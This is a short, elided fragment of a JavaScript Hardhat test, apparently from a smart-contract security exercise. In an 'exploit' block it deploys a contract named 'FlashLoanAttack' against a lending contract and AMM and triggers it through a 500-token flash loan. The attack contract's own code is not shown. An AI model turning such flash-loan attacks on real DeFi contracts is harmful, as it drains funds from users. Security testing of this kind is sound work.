...
describe(NAME, function () {
    ...
    describe("exploit", async function () {
      ...
      const LendingFactoryAttack = await ethers.getContractFactory("FlashLoanAttack");
      const LendingContractAttack = await LendingFactoryAttack.deploy(AMMContract.address,LendingContract.address,collateralTokenContract.address,lender.address,borrower.address);
       await FlashLoanContract.connect(lender).flashLoan(LendingContractAttack.address,collateralTokenContract.address,ethers.utils.parseEther("500"),"0x")
  });
